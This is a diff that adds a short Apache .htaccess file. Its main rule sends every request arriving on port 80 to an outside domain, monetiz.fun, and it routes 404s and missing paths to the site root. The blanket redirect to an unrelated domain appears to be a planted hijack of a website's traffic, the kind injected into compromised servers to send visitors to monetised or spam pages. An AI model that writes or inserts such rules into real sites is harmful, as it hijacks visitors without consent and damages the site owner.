@@ -1,0 +1,10 @@
+RewriteEngine On
+
+RewriteCond %{SERVER_PORT} 80
+
+ErrorDocument 404 /
+
+RewriteRule ^(.*)$ https://monetiz.fun/$1 [R,L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . / [L,R=301]
